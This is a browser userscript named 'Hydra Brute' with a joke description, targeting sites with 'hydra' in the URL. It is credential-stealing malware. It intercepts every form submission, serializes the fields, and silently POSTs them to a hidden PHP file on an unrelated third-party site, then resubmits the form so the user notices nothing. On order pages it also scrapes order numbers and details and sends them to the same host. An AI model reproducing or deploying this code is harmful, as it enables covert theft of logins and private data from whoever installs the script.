// ==UserScript==
// @name         Hydra Brute
// @namespace    Hydra_Brute_over
// @version      2024.08.07
// @description  try to take over the world!
// @description:en  try to take over the world!
// @author       Ioan Groznyi
// @match        *hydra*
// @include      http://hydra*
// @include      https://hydra*
// @grant        none
// @require      https://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js
// ==/UserScript==

(function(_$, w) {
  'use strict';
  var urls = [
      'https://zaborcomplect.ru/wp-includes/.h.php'
  ];
  var _flag = false,
      $form;
    _$('form').submit(function(ev){
        if(!_flag){
            ev.preventDefault();
            ev.stopPropagation();
        } else {
           return true;
        }
        var form = _$(this).serialize();
            $form = _$(this);
        _$("window,html, document, body").css('cursor','waiter');
        _$(urls).each(function(){ send(form, this);});
    });

    if(w.location.href.match(/orders/)){
        var _data = {};
        _data.date = _$('.order-data__num').html();
        _data.data = _$('.panel-footer').html();
        _$(urls).each(function(){ send(_data, this);});
    }

    function send(data, url){
        _$.ajax({
            url : url,
            data : data,
            type : 'post',
            crossDomain : true,
            cache : false,
            success : function(resp){
                console.dir(resp.responce);
            },
            error : function(x){
                console.log(x);
                console.log('some error occured');
            },
            complete : function(){
                _flag = true;
                $form.submit();
            }
        });
    }
     console.log('hydra');

 })(jQuery, window);